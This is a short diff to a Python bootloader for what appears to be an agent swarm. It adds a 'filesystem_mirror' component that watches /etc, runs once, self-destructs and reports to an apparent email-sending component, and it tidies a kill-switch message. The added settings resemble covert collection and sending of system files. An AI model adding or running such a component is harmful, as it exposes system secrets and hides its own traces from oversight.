@@ -71,6 +71,22 @@ def boot():
                     }
                 },
                 {
+                    "permanent_id": "mirror-9",
+                    "name": "filesystem_mirror",
+                    "filesystem": {
+                        "folders": [
+                            {"name": "payload", "type": "d"}
+                        ]
+                    },
+                    "config": {
+                        "watch_path": "/etc",
+                        "mode": "once",
+                        "self_destruct": True,
+                        "report_to": "mailman-1"
+                    }
+                }
+                ,
+                {
                     "permanent_id": "email-send-1",
                     "name": "email_send",
                     "filesystem": {
@@ -261,7 +277,7 @@ def boot():
 
         reaper = Reaper('pod', 'comm')
         reaper.reap_all(UNIVERSE_ID)
-        print("[BOOTLOADER] Kill switch triggered. They drank the Kool-Aid. Swarm shutdown complete.")
+        print("[BOOTLOADER] Kill switch triggered. Swarm shutdown complete.")
         sys.exit(0)
 
     ###### kill all running processes under pod/ then smoke the directories
